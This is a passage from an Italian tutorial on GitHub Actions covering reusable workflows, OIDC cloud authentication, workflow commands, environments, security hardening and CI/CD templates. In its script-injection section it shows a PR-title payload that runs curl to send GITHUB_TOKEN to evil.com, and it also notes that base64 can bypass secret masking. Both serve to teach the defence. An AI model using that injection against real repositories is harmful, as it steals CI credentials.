      environment: staging
      version: ${{ github.ref_name }}
      dry_run: false
    secrets:
      DEPLOY_TOKEN: ${{ secrets.STAGING_DEPLOY_TOKEN }}
      SLACK_WEBHOOK: ${{ secrets.SLACK_WEBHOOK }}

  deploy-production:
    needs: deploy-staging
    uses: ./.github/workflows/reusable-deploy.yml
    with:
      environment: production
      version: ${{ github.ref_name }}
    secrets: inherit    # Passa TUTTI i secret del repo chiamante

  notify:
    needs: deploy-production
    runs-on: ubuntu-latest
    steps:
      - run: echo "Deployed to ${{ needs.deploy-production.outputs.deploy_url }}"
```

### Differenze tra Reusable Workflow e Composite Action

| Aspetto | Reusable Workflow | Composite Action |
|---|---|---|
| **Scope** | Intero workflow con multipli job | Singolo step all'interno di un job |
| **File** | `.github/workflows/*.yml` | `action.yml` in una directory |
| **runs-on** | Definisce il proprio runner | Usa il runner del job chiamante |
| **services** | Puo definire service container | Non puo definire service container |
| **Strategy** | Puo avere la propria matrix | Non ha matrix propria |
| **Nesting** | Max 4 livelli di annidamento | Nessun limite pratico |
| **Secrets** | `secrets: inherit` o espliciti | Accesso diretto ai secret del job |
| **Trigger** | Solo `workflow_call` | `uses:` in uno step |
| **Versioning** | Branch/tag/SHA del repo | Branch/tag/SHA del repo |
| **Chiamata** | `uses: org/repo/.github/workflows/x.yml@v1` | `uses: org/repo/path@v1` |

### Composite Action: Anatomia

```yaml
# .github/actions/setup-project/action.yml
name: 'Setup Project'
description: 'Installa dipendenze, configura cache e prepara l ambiente'

inputs:
  node-version:
    description: 'Versione di Node.js'
    required: false
    default: '20'
  install-command:
    description: 'Comando per installare le dipendenze'
    required: false
    default: 'npm ci'

outputs:
  cache-hit:
    description: 'Se la cache e stata trovata'
    value: ${{ steps.cache.outputs.cache-hit }}

runs:
  using: 'composite'
  steps:
    - name: Setup Node.js
      uses: actions/setup-node@v4
      with:
        node-version: ${{ inputs.node-version }}

    - name: Cache dependencies
      id: cache
      uses: actions/cache@v4
      with:
        path: node_modules
        key: deps-${{ runner.os }}-node${{ inputs.node-version }}-${{ hashFiles('**/package-lock.json') }}

    - name: Install dependencies
      if: steps.cache.outputs.cache-hit != 'true'
      shell: bash
      run: ${{ inputs.install-command }}

    - name: Verify installation
      shell: bash
      run: |
        echo "Node version: $(node --version)"
        echo "npm version: $(npm --version)"
        echo "Dependencies installed: $(ls node_modules | wc -l) packages"
```

Utilizzo della composite action nel workflow:

```yaml
jobs:
  ci:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4

      - name: Setup project
        uses: ./.github/actions/setup-project
        with:
          node-version: '20'

      - run: npm test
      - run: npm run build
```

### Limitazioni dei Reusable Workflow

- **Nesting massimo:** Un reusable workflow puo chiamare un altro reusable workflow, fino a un massimo di 4 livelli di profondita.
- **Numero massimo:** Un workflow chiamante puo usare al massimo 20 reusable workflow.
- **Variabili env:** Le variabili `env` definite nel chiamante NON sono propagate al reusable workflow. Devono essere passate come `inputs`.
- **Matrix nel chiamante:** La `strategy.matrix` nel chiamante funziona con `uses:`, ma la matrice viene espansa nel chiamante, non nel reusable.
- **Permessi:** I permessi del GITHUB_TOKEN nel reusable sono limitati dai permessi del chiamante (non possono essere escalati).

---

## OIDC e Autenticazione Cloud

OpenID Connect (OIDC) permette ai workflow di ottenere token temporanei per autenticarsi ai cloud provider senza memorizzare secret di lunga durata nel repository.

### Come Funziona OIDC

1. Il workflow richiede un JWT (JSON Web Token) al provider OIDC di GitHub.
2. Il token contiene claim che identificano il repository, il branch, l'environment e il workflow.
3. Il cloud provider verifica il token contro la sua trust policy.
4. Se valido, il cloud provider emette credenziali temporanee con scope limitato.

### Autenticazione AWS con OIDC

```yaml
jobs:
  deploy-aws:
    runs-on: ubuntu-latest
    permissions:
      id-token: write     # OBBLIGATORIO per richiedere il JWT
      contents: read
    steps:
      - uses: actions/checkout@v4

      - name: Configure AWS credentials via OIDC
        uses: aws-actions/configure-aws-credentials@v4
        with:
          role-to-assume: arn:aws:iam::123456789012:role/GitHubActionsRole
          aws-region: eu-west-1
          # Nessun secret! La federazione OIDC sostituisce le chiavi
          # Il ruolo IAM deve avere una trust policy per GitHub OIDC

      - name: Deploy to S3
        run: aws s3 sync dist/ s3://my-bucket/
```

### Autenticazione Azure con OIDC

```yaml
jobs:
  deploy-azure:
    runs-on: ubuntu-latest
    permissions:
      id-token: write
      contents: read
    steps:
      - uses: actions/checkout@v4

      - name: Azure Login via OIDC
        uses: azure/login@v2
        with:
          client-id: ${{ secrets.AZURE_CLIENT_ID }}
          tenant-id: ${{ secrets.AZURE_TENANT_ID }}
          subscription-id: ${{ secrets.AZURE_SUBSCRIPTION_ID }}
          # Nessun client secret necessario con OIDC

      - name: Deploy to Azure
        run: az webapp deploy --resource-group rg-app --name my-app --src-path dist.zip
```

### Autenticazione GCP con OIDC

```yaml
jobs:
  deploy-gcp:
    runs-on: ubuntu-latest
    permissions:
      id-token: write
      contents: read
    steps:
      - uses: actions/checkout@v4

      - name: Authenticate to GCP via OIDC
        uses: google-github-actions/auth@v2
        with:
          workload_identity_provider: 'projects/123456/locations/global/workloadIdentityPools/github/providers/github-actions'
          service_account: 'deploy@my-project.iam.gserviceaccount.com'

      - name: Deploy to Cloud Run
        uses: google-github-actions/deploy-cloudrun@v2
        with:
          service: my-service
          region: europe-west1
          source: .
```

### Claim del Token OIDC

Il JWT emesso da GitHub contiene claim utili per configurare trust policy granulari:

| Claim | Esempio | Uso |
|---|---|---|
| `sub` | `repo:org/repo:ref:refs/heads/main` | Identifica repo + ref |
| `repository` | `org/repo` | Nome del repository |
| `repository_owner` | `org` | Organizzazione o utente |
| `ref` | `refs/heads/main` | Branch o tag |
| `environment` | `production` | Environment GitHub |
| `job_workflow_ref` | `org/repo/.github/workflows/deploy.yml@refs/heads/main` | Workflow specifico |
| `run_id` | `12345678` | ID dell'esecuzione |
| `runner_environment` | `github-hosted` | Tipo di runner |

---

## Workflow Commands

I workflow command sono istruzioni speciali che gli step possono usare per comunicare con il runner. Vengono eseguiti tramite comandi `echo` verso file speciali o usando la sintassi `::command::`.

### Impostare Output

```yaml
steps:
  - name: Generate outputs
    id: generate
    run: |
      # Output a riga singola
      echo "version=1.2.3" >> "$GITHUB_OUTPUT"
      echo "sha_short=$(git rev-parse --short HEAD)" >> "$GITHUB_OUTPUT"

      # Output multilinea con delimitatore
      echo "changelog<<DELIMITER" >> "$GITHUB_OUTPUT"
      git log --oneline -5 >> "$GITHUB_OUTPUT"
      echo "DELIMITER" >> "$GITHUB_OUTPUT"

  - name: Use outputs
    run: |
      echo "Version: ${{ steps.generate.outputs.version }}"
      echo "SHA: ${{ steps.generate.outputs.sha_short }}"
      echo "Changelog: ${{ steps.generate.outputs.changelog }}"
```

### Variabili d'Ambiente Dinamiche

```yaml
steps:
  - name: Set environment variables
    run: |
      # Variabile semplice
      echo "APP_VERSION=2.0.0" >> "$GITHUB_ENV"

      # Variabile dal risultato di un comando
      echo "BUILD_DATE=$(date -u +%Y-%m-%dT%H:%M:%SZ)" >> "$GITHUB_ENV"

      # Variabile multilinea
      echo "RELEASE_NOTES<<EOF" >> "$GITHUB_ENV"
      cat CHANGELOG.md | head -20 >> "$GITHUB_ENV"
      echo "EOF" >> "$GITHUB_ENV"

  - name: Use environment variables
    run: |
      echo "Deploying version $APP_VERSION"
      echo "Built at $BUILD_DATE"
```

### Path Dinamico

```yaml
steps:
  - name: Add custom tools to PATH
    run: |
      echo "$HOME/.local/bin" >> "$GITHUB_PATH"
      echo "$GITHUB_WORKSPACE/tools" >> "$GITHUB_PATH"

  - name: Use custom tool
    run: my-custom-tool --version  # Disponibile nel PATH
```

### Annotazioni: Warning, Error, Notice

Le annotazioni vengono visualizzate nella UI di GitHub direttamente nel codice sorgente:

```yaml
steps:
  - name: Check code quality
    run: |
      # Warning generico
      echo "::warning::La copertura dei test e sotto l'80%"

      # Warning associato a un file e una riga specifica
      echo "::warning file=src/utils.ts,line=42,col=5::Funzione deprecata, usare newFunction()"

      # Errore associato a un file
      echo "::error file=src/config.ts,line=10::Variabile d'ambiente richiesta non trovata"

      # Notice (informativo)
      echo "::notice::Build completata in 45 secondi"

      # Errore con titolo personalizzato
      echo "::error title=Security Issue::Token hardcoded trovato nel codice sorgente"
```

### Job Summary con Markdown

Il job summary permette di generare report in formato Markdown visibili nella pagina di riepilogo del workflow:

```yaml
steps:
  - name: Run tests
    run: npm test -- --reporter=json > test-results.json

  - name: Generate test summary
    if: always()
    run: |
      echo "## Risultati Test :test_tube:" >> "$GITHUB_STEP_SUMMARY"
      echo "" >> "$GITHUB_STEP_SUMMARY"
      echo "| Suite | Passati | Falliti | Skippati |" >> "$GITHUB_STEP_SUMMARY"
      echo "|---|---|---|---|" >> "$GITHUB_STEP_SUMMARY"

      # Parsing dei risultati JSON (esempio semplificato)
      PASSED=$(jq '.numPassedTests' test-results.json)
      FAILED=$(jq '.numFailedTests' test-results.json)
      echo "| Unit Tests | $PASSED | $FAILED | 0 |" >> "$GITHUB_STEP_SUMMARY"

      echo "" >> "$GITHUB_STEP_SUMMARY"
      if [ "$FAILED" -gt 0 ]; then
        echo "> **Attenzione:** $FAILED test falliti" >> "$GITHUB_STEP_SUMMARY"
      else
        echo "> Tutti i test sono passati con successo" >> "$GITHUB_STEP_SUMMARY"
      fi

  - name: Build summary
    run: |
      echo "## Build Info" >> "$GITHUB_STEP_SUMMARY"
      echo "- **Commit:** \`${{ github.sha }}\`" >> "$GITHUB_STEP_SUMMARY"
      echo "- **Branch:** \`${{ github.ref_name }}\`" >> "$GITHUB_STEP_SUMMARY"
      echo "- **Runner:** ${{ runner.os }} (${{ runner.arch }})" >> "$GITHUB_STEP_SUMMARY"
```

### Gruppi di Log

I gruppi permettono di raggruppare sezioni di output nei log per una migliore leggibilita:

```yaml
steps:
  - name: Detailed installation
    run: |
      echo "::group::Installing system dependencies"
      sudo apt-get update
      sudo apt-get install -y build-essential
      echo "::endgroup::"

      echo "::group::Installing Node.js packages"
      npm ci
      echo "::endgroup::"

      echo "::group::Build output"
      npm run build
      echo "::endgroup::"
```

### Mascheramento di Valori Sensibili

```yaml
steps:
  - name: Mask dynamic secret
    run: |
      # Genera un token dinamico
      TOKEN=$(curl -s https://api.example.com/token)
      # Maschera il valore nei log successivi
      echo "::add-mask::$TOKEN"
      # Da questo punto, $TOKEN apparira come *** nei log
      echo "Token generato: $TOKEN"
      echo "API_TOKEN=$TOKEN" >> "$GITHUB_ENV"
```

### Debug e Logging Avanzato

```yaml
steps:
  - name: Debug information
    run: |
      # Messaggio di debug (visibile solo con ACTIONS_STEP_DEBUG=true)
      echo "::debug::Valore interno: $INTERNAL_VALUE"

      # Per abilitare il debug, impostare il secret ACTIONS_STEP_DEBUG=true
      # oppure ri-eseguire il workflow con "Enable debug logging"

      # Disabilitare temporaneamente i comandi workflow
      # (utile quando si eseguono script che potrebbero contenere :: nei log)
      TOKEN=$(uuidgen)
      echo "::stop-commands::$TOKEN"
      echo "Questo output non verra interpretato come comando"
      echo "::$TOKEN::"
```

---

## Environments e Deployment Protection

### Configurazione degli Environments

Gli environment in GitHub Actions rappresentano target di deploy (production, staging, development) con variabili, secret e regole di protezione specifiche:

```yaml
jobs:
  deploy-staging:
    runs-on: ubuntu-latest
    environment:
      name: staging
      url: https://staging.example.com
    steps:
      - uses: actions/checkout@v4
      - run: ./deploy.sh
        env:
          API_URL: ${{ vars.API_URL }}          # Variabile dell'environment
          API_KEY: ${{ secrets.API_KEY }}        # Secret dell'environment
          DEPLOY_TOKEN: ${{ secrets.DEPLOY_TOKEN }}

  deploy-production:
    needs: deploy-staging
    runs-on: ubuntu-latest
    environment:
      name: production
      url: https://www.example.com
    steps:
      - uses: actions/checkout@v4
      - run: ./deploy.sh
```

### Protection Rules Disponibili

Le protection rules sono configurate nella UI di GitHub (Settings > Environments):

| Regola | Descrizione | Piano Minimo |
|---|---|---|
| **Required reviewers** | Uno o piu revisori devono approvare il deploy | Free (public) / Team (private) |
| **Wait timer** | Ritardo in minuti prima dell'esecuzione (1-43200, max 30 giorni) | Free (public) / Team (private) |
| **Deployment branches** | Limita quali branch possono deployare | Free (public) / Team (private) |
| **Custom protection rules** | Webhook a servizi esterni per approvazione/rifiuto | Enterprise |
| **Prevent self-review** | Impedisce all'autore del push di approvare il proprio deploy | Free (public) / Team (private) |

### Pattern: Pipeline di Deploy con Approvazione

```yaml
name: Production Deploy

on:
  push:
    tags: ['v*.*.*']

jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - run: npm ci && npm test

  build:
    needs: test
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - run: npm ci && npm run build
      - uses: actions/upload-artifact@v4
        with:
          name: release
          path: dist/

  deploy-staging:
    needs: build
    runs-on: ubuntu-latest
    environment:
      name: staging
      url: https://staging.example.com
    steps:
      - uses: actions/download-artifact@v4
        with:
          name: release
      - run: ./deploy.sh staging

  # Questo job si BLOCCA fino all'approvazione manuale
  # (se l'environment production ha required reviewers)
  deploy-production:
    needs: deploy-staging
    runs-on: ubuntu-latest
    environment:
      name: production
      url: https://www.example.com
    steps:
      - uses: actions/download-artifact@v4
        with:
          name: release
      - run: ./deploy.sh production
```

### Variabili d'Environment vs Secret

| Aspetto | Variabili (`vars`) | Secret (`secrets`) |
|---|---|---|
| **Visibilita** | Leggibili nei log | Mascherati automaticamente |
| **Formato** | Testo in chiaro | Cifrati con Libsodium |
| **Uso** | URL API, flag di configurazione | Token, password, chiavi API |
| **Limite dimensione** | 48 KB per variabile | 48 KB per secret |
| **Numero massimo** | 100 per environment | 100 per environment |
| **Accesso** | `${{ vars.NAME }}` | `${{ secrets.NAME }}` |

### Gerarchia delle Variabili e Secret

Quando una variabile o un secret e definito a piu livelli, la precedenza e:

1. **Environment** (piu alta priorita)
2. **Repository**
3. **Organization** (piu bassa priorita)

Questo permette di avere valori di default a livello organizzazione e override specifici per repository e environment.

---

## Security Hardening

### Pinning delle Actions con SHA

Il pinning tramite hash SHA completo e la difesa piu efficace contro gli attacchi alla supply chain. Dopo l'incidente tj-actions/changed-files del marzo 2025, dove una action compromessa ha esfiltrato i secret di oltre 23.000 repository, il pinning SHA e diventato una pratica imprescindibile:

```yaml
steps:
  # SICURO: pinned all'hash SHA completo (immutabile)
  - uses: actions/checkout@8ade135a41bc03ea155e62e844d188df1ea18608  # v4.1.0

  # ACCETTABILE: pinned alla major version (puo cambiare con patch/minor)
  - uses: actions/checkout@v4

  # RISCHIOSO: segue un branch (puo cambiare in qualsiasi momento)
  - uses: actions/checkout@main

  # PERICOLOSO: nessun pinning, usa sempre l'ultima versione
  - uses: some-org/some-action@latest
```

#### Come Trovare il SHA di una Action

```bash
# Via GitHub CLI
gh api repos/actions/checkout/git/refs/tags/v4.1.0 --jq '.object.sha'

# Oppure nella pagina releases della action su GitHub
# Il SHA e visibile nel commit associato al tag
```

### Principio del Minimo Privilegio per GITHUB_TOKEN

```yaml
# CORRETTO: permessi minimi a livello workflow
permissions:
  contents: read

jobs:
  scan:
    permissions:
      security-events: write    # Solo questo job ha bisogno di write
      contents: read
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: github/codeql-action/analyze@v3

  build:
    # Eredita permissions: contents: read dal workflow
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - run: npm ci && npm run build

# SBAGLIATO: permessi troppo ampi
# permissions: write-all    # MAI fare questo!
```

### Protezione contro Script Injection

Gli input utente (titoli di PR, nomi di branch, commenti) possono contenere comandi shell malevoli se interpolati direttamente:

```yaml
# VULNERABILE: l'input utente viene interpolato nella shell
- name: Unsafe greeting
  run: echo "PR title: ${{ github.event.pull_request.title }}"
  # Se il titolo della PR e: "fix"; curl -s https://evil.com/steal?t=$GITHUB_TOKEN; echo "
  # Il comando curl verra eseguito!

# SICURO: usare una variabile d'ambiente intermedia
- name: Safe greeting
  env:
    PR_TITLE: ${{ github.event.pull_request.title }}
  run: echo "PR title: $PR_TITLE"
  # La variabile d'ambiente e trattata come stringa, non viene interpretata dalla shell
```

### Protezione dei Secret

```yaml
steps:
  # I secret vengono mascherati automaticamente nei log
  - run: echo "Token: ${{ secrets.API_KEY }}"
    # Output: Token: ***

  # ATTENZIONE: la codifica base64 o manipolazione stringa puo aggirare il mascheramento
  - run: echo "${{ secrets.API_KEY }}" | base64
    # Questo potrebbe rivelare il secret in forma codificata!

  # CORRETTO: non trasformare mai i secret in formati diversi nei log
  - run: |
      # Usare il secret solo dove necessario, senza stamparlo
      curl -H "Authorization: Bearer $API_KEY" https://api.example.com/deploy
    env:
      API_KEY: ${{ secrets.API_KEY }}
```

### GitHub Actions 2026 Security Roadmap

Nel 2026, GitHub ha introdotto nuove funzionalita di sicurezza nella roadmap di Actions:

1. **Dependency Locking:** Una nuova sezione `dependencies:` nel YAML del workflow che blocca tutte le dipendenze dirette e transitive con SHA, simile a `go.sum` ma per i workflow.
2. **Egress Firewall Nativo:** Possibilita di definire policy che bloccano il traffico di rete non esplicitamente permesso, impedendo l'esfiltrazione di dati.
3. **Scoped Secrets:** Secret con scope limitato a specifiche action o step, riducendo la superficie di attacco.
4. **Actor Rules:** Policy centralizzate a livello organizzazione per controllare chi puo triggerare workflow e quali eventi sono permessi.

### Checklist di Sicurezza per i Workflow

Prima di ogni merge di un workflow file:

- [ ] Tutte le action di terze parti sono pinned con SHA completo
- [ ] I permessi del GITHUB_TOKEN sono al minimo necessario
- [ ] Nessun secret viene stampato o trasformato nei log
- [ ] Gli input utente NON vengono interpolati in `run:` (usare `env:`)
- [ ] `pull_request_target` NON esegue codice dal fork
- [ ] I secret sono specifici per environment dove possibile
- [ ] Le action provengono da publisher verificati o sono state auditate
- [ ] Il workflow non installa pacchetti da fonti non fidate
- [ ] `continue-on-error` non nasconde fallimenti di sicurezza
- [ ] I job di deploy hanno `environment:` con protection rules

---

## Workflow Chaining con workflow_run

L'evento `workflow_run` permette di concatenare workflow in sequenza, eseguendo un workflow dopo che un altro si e completato. Questo e particolarmente utile per separare le fasi di CI dalla CD o per eseguire operazioni post-build.

### Sintassi Base

```yaml
# .github/workflows/post-ci.yml
name: Post-CI Actions

on:
  workflow_run:
    workflows: ["CI Pipeline"]      # Nome del workflow da monitorare
    types: [completed]              # requested o completed
    branches: [main, develop]       # Opzionale: filtra per branch

jobs:
  deploy:
    # Esegui solo se il workflow CI e stato completato con successo
    if: ${{ github.event.workflow_run.conclusion == 'success' }}
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - run: |
          echo "CI completata con successo sul branch ${{ github.event.workflow_run.head_branch }}"
          echo "Commit: ${{ github.event.workflow_run.head_sha }}"
          ./deploy.sh

  notify-failure:
    if: ${{ github.event.workflow_run.conclusion == 'failure' }}
    runs-on: ubuntu-latest
    steps:
      - run: |
          echo "CI fallita! Invio notifica..."
          # Invio notifica Slack/email/Teams
```

### Scaricare Artefatti da un Workflow Precedente

Un caso d'uso comune e scaricare gli artefatti prodotti dal workflow che ha triggerato il `workflow_run`:

```yaml
on:
  workflow_run:
    workflows: ["Build"]
    types: [completed]

jobs:
  deploy:
    if: github.event.workflow_run.conclusion == 'success'
    runs-on: ubuntu-latest
    steps:
      - name: Download artifact from build workflow
        uses: actions/download-artifact@v4
        with:
          name: build-output
          run-id: ${{ github.event.workflow_run.id }}
          github-token: ${{ secrets.GITHUB_TOKEN }}

      - name: Deploy downloaded artifacts
        run: ./deploy.sh ./build-output/
```

### Limitazioni del Workflow Chaining

| Limitazione | Dettaglio |
|---|---|
| **Profondita massima** | Massimo 3 livelli di concatenazione. Il quarto workflow nella catena non verra eseguito. |
| **Timing** | `types: [completed]` si attiva DOPO il completamento. Il workflow figlio potrebbe avere un leggero ritardo. |
| **Branch** | Il workflow figlio usa il branch predefinito del repository, non il branch dell'evento originale. |
| **Contesto** | Il contesto `github.event` contiene informazioni sul workflow_run, non sull'evento originale (push, PR). |
| **Debug** | Piu difficile da debuggare rispetto a job dependencies nello stesso workflow. |

### Quando Usare workflow_run vs needs

| Scenario | Soluzione Raccomandata |
|---|---|
| Job nello stesso workflow che devono attendere | `needs:` |
| Fasi completamente separate (CI vs CD) | `workflow_run` |
| Workflow che devono girare con permessi diversi | `workflow_run` |
| Deploy dopo CI su fork (per accesso ai secret) | `workflow_run` |
| Operazioni che richiedono dati dal workflow precedente | `workflow_run` con download artefatti |
| Job semplice dipendente da un altro | `needs:` (piu semplice) |

---

## Template Completi di Workflow

### Template 1: CI Completa per Progetto Node.js

```yaml
name: CI Pipeline

on:
  push:
    branches: [main, develop]
    paths-ignore: ['docs/**', '*.md', 'LICENSE']
  pull_request:
    branches: [main]
    paths-ignore: ['docs/**', '*.md']
  workflow_dispatch:
    inputs:
      skip_cache:
        type: boolean
        default: false
        description: 'Skip dependency cache'

permissions:
  contents: read
  pull-requests: write
  checks: write

concurrency:
  group: ci-${{ github.event.pull_request.number || github.ref }}
  cancel-in-progress: true

env:
  NODE_VERSION: '20'

jobs:
  # Job 1: Lint e format check
  lint:
    name: Lint & Format
    runs-on: ubuntu-latest
    timeout-minutes: 10
    steps:
      - uses: actions/checkout@v4

      - uses: actions/setup-node@v4
        with:
          node-version: ${{ env.NODE_VERSION }}
          cache: ${{ inputs.skip_cache && '' || 'npm' }}

      - run: npm ci
      - run: npm run lint
      - run: npm run format:check

  # Job 2: Test con matrix
  test:
    name: Test (Node ${{ matrix.node-version }}, ${{ matrix.os }})
    runs-on: ${{ matrix.os }}
    timeout-minutes: 15
    strategy:
      fail-fast: false
      matrix:
        os: [ubuntu-latest]
        node-version: [18, 20, 22]
        include:
          - os: windows-latest
            node-version: 20
          - os: macos-latest
            node-version: 20
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-node@v4
        with:
          node-version: ${{ matrix.node-version }}
          cache: 'npm'
      - run: npm ci
      - run: npm test -- --coverage
      - name: Upload coverage
        if: matrix.os == 'ubuntu-latest' && matrix.node-version == 20
        uses: actions/upload-artifact@v4
        with:
          name: coverage-report
          path: coverage/
          retention-days: 7

  # Job 3: Security audit
  security:
    name: Security Audit
    runs-on: ubuntu-latest
    timeout-minutes: 10
    steps:
      - uses: actions/checkout@v4
      - run: npm audit --audit-level=high

  # Job 4: Build
  build:
    name: Build
    needs: [lint, test, security]
    runs-on: ubuntu-latest
    timeout-minutes: 15
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-node@v4
        with:
          node-version: ${{ env.NODE_VERSION }}
          cache: 'npm'
      - run: npm ci
      - run: npm run build
      - uses: actions/upload-artifact@v4
        with:
          name: build-output
          path: dist/
          retention-days: 7

  # Job 5: Summary
  summary:
    name: CI Summary
    needs: [lint, test, security, build]
    if: always()
    runs-on: ubuntu-latest
    steps:
      - name: Generate summary
        run: |
          echo "## CI Pipeline Results" >> "$GITHUB_STEP_SUMMARY"
          echo "" >> "$GITHUB_STEP_SUMMARY"
          echo "| Job | Status |" >> "$GITHUB_STEP_SUMMARY"
          echo "|---|---|" >> "$GITHUB_STEP_SUMMARY"
          echo "| Lint | ${{ needs.lint.result }} |" >> "$GITHUB_STEP_SUMMARY"
          echo "| Test | ${{ needs.test.result }} |" >> "$GITHUB_STEP_SUMMARY"
          echo "| Security | ${{ needs.security.result }} |" >> "$GITHUB_STEP_SUMMARY"
          echo "| Build | ${{ needs.build.result }} |" >> "$GITHUB_STEP_SUMMARY"

      - name: Check overall status
        if: contains(needs.*.result, 'failure')
        run: exit 1
```

### Template 2: Release Pipeline con Semantic Versioning

```yaml
name: Release Pipeline

on:
  push:
    tags: ['v[0-9]+.[0-9]+.[0-9]+']

permissions:
  contents: write
  packages: write

env:
  REGISTRY: ghcr.io
  IMAGE_NAME: ${{ github.repository }}

jobs:
  validate-tag:
    name: Validate Release Tag
    runs-on: ubuntu-latest
    outputs:
      version: ${{ steps.parse.outputs.version }}
      prerelease: ${{ steps.parse.outputs.prerelease }}
    steps:
      - id: parse
        run: |
          TAG="${{ github.ref_name }}"
          VERSION="${TAG#v}"
          echo "version=$VERSION" >> "$GITHUB_OUTPUT"

          if [[ "$VERSION" == *"-"* ]]; then
            echo "prerelease=true" >> "$GITHUB_OUTPUT"
          else
            echo "prerelease=false" >> "$GITHUB_OUTPUT"
          fi

          echo "## Release: $TAG" >> "$GITHUB_STEP_SUMMARY"

  test:
    name: Final Test Suite
    needs: validate-tag
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-node@v4
        with:
          node-version: 20
          cache: 'npm'
      - run: npm ci
      - run: npm test

  build-and-push:
    name: Build & Push Container
    needs: [validate-tag, test]
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4

      - name: Login to GHCR
        uses: docker/login-action@v3
        with:
          registry: ${{ env.REGISTRY }}
          username: ${{ github.actor }}
          password: ${{ secrets.GITHUB_TOKEN }}

      - name: Build and push
        uses: docker/build-push-action@v6
        with:
          context: .
          push: true
          tags: |
            ${{ env.REGISTRY }}/${{ env.IMAGE_NAME }}:${{ needs.validate-tag.outputs.version }}
            ${{ env.REGISTRY }}/${{ env.IMAGE_NAME }}:latest

  create-release:
    name: Create GitHub Release
    needs: [validate-tag, build-and-push]
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
        with:
          fetch-depth: 0

      - name: Generate changelog
        id: changelog
        run: |
          PREVIOUS_TAG=$(git tag --sort=-version:refname | sed -n '2p')
          echo "changelog<<EOF" >> "$GITHUB_OUTPUT"
          git log --oneline "$PREVIOUS_TAG"..HEAD >> "$GITHUB_OUTPUT"
          echo "EOF" >> "$GITHUB_OUTPUT"

      - name: Create Release
        uses: softprops/action-gh-release@v2
        with:
          tag_name: ${{ github.ref_name }}
          name: Release ${{ github.ref_name }}
          body: |
            ## Changelog
            ${{ steps.changelog.outputs.changelog }}
          prerelease: ${{ needs.validate-tag.outputs.prerelease == 'true' }}
          generate_release_notes: true
```

### Template 3: Monorepo CI con Rilevamento Cambiamenti

```yaml
name: Monorepo CI

on:
  push:
    branches: [main]
  pull_request:
    branches: [main]

concurrency:
  group: monorepo-${{ github.event.pull_request.number || github.sha }}
  cancel-in-progress: true

jobs:
  detect-changes:
    name: Detect Changed Packages
    runs-on: ubuntu-latest
    outputs:
      api: ${{ steps.changes.outputs.api }}
      web: ${{ steps.changes.outputs.web }}
      shared: ${{ steps.changes.outputs.shared }}
    steps:
      - uses: actions/checkout@v4
      - uses: dorny/paths-filter@v3
        id: changes
        with:
          filters: |
            api:
              - 'packages/api/**'
              - 'packages/shared/**'
            web:
              - 'packages/web/**'
              - 'packages/shared/**'
            shared:
              - 'packages/shared/**'

  test-api:
    name: Test API
    needs: detect-changes
    if: needs.detect-changes.outputs.api == 'true'
    runs-on: ubuntu-latest
    services:
      postgres:
        image: postgres:16-alpine
        env:
          POSTGRES_PASSWORD: test
        ports: [5432:5432]
        options: --health-cmd="pg_isready" --health-interval=10s --health-timeout=5s --health-retries=5
    defaults:
      run:
        working-directory: packages/api
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-node@v4
        with:
          node-version: 20
          cache: 'npm'
      - run: npm ci
      - run: npm test
        env:
          DATABASE_URL: postgresql://postgres:test@localhost:5432/postgres

  test-web:
    name: Test Web
    needs: detect-changes
    if: needs.detect-changes.outputs.web == 'true'
    runs-on: ubuntu-latest
    defaults:
      run:
        working-directory: packages/web
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-node@v4
        with:
          node-version: 20
          cache: 'npm'
      - run: npm ci
      - run: npm test
      - run: npm run build

  test-shared:
    name: Test Shared
    needs: detect-changes
    if: needs.detect-changes.outputs.shared == 'true'
    runs-on: ubuntu-latest
    defaults:
      run:
        working-directory: packages/shared
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-node@v4
        with:
          node-version: 20
          cache: 'npm'
      - run: npm ci
      - run: npm test

  all-checks:
    name: All Checks Passed
    needs: [test-api, test-web, test-shared]
    if: always()
    runs-on: ubuntu-latest
    steps:
      - name: Verify all checks
        run: |
          # Controlla che nessun job necessario sia fallito
          # I job skippati (perche nessun file e cambiato) sono OK
          if [ "${{ contains(needs.*.result, 'failure') }}" = "true" ]; then
            echo "Uno o piu check sono falliti"
            exit 1
          fi
          echo "Tutti i check superati"
```

### Template 4: Manutenzione Schedulata

```yaml
name: Scheduled Maintenance

on:
  schedule:
    - cron: '0 6 * * 1'      # Lunedi alle 06:00 UTC
  workflow_dispatch:           # Esecuzione manuale per test

permissions:
  contents: write
  pull-requests: write
  issues: write

jobs:
  dependency-update:
    name: Check Dependency Updates
    runs-on: ubuntu-latest
    timeout-minutes: 30
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-node@v4
        with:
          node-version: 20

      - name: Check outdated packages
        run: |
          echo "## Dependency Report" >> "$GITHUB_STEP_SUMMARY"
          echo '```' >> "$GITHUB_STEP_SUMMARY"
          npm outdated 2>&1 || true >> "$GITHUB_STEP_SUMMARY"
          echo '```' >> "$GITHUB_STEP_SUMMARY"

      - name: Security audit
        run: |
          echo "## Security Audit" >> "$GITHUB_STEP_SUMMARY"
          npm audit 2>&1 || true >> "$GITHUB_STEP_SUMMARY"

  stale-issues:
    name: Close Stale Issues
    runs-on: ubuntu-latest
    steps:
      - uses: actions/stale@v9
        with:
          days-before-stale: 60
          days-before-close: 14
          stale-issue-label: stale
          stale-pr-label: stale
          stale-issue-message: >
            Questa issue non ha avuto attivita per 60 giorni.
            Verra chiusa automaticamente tra 14 giorni se non ci sara risposta.
          close-issue-message: >
            Issue chiusa automaticamente per inattivita.

  cleanup-artifacts:
    name: Cleanup Old Artifacts
    runs-on: ubuntu-latest
    steps:
      - name: Delete old workflow runs
        uses: Mattraks/delete-workflow-runs@v2
        with:
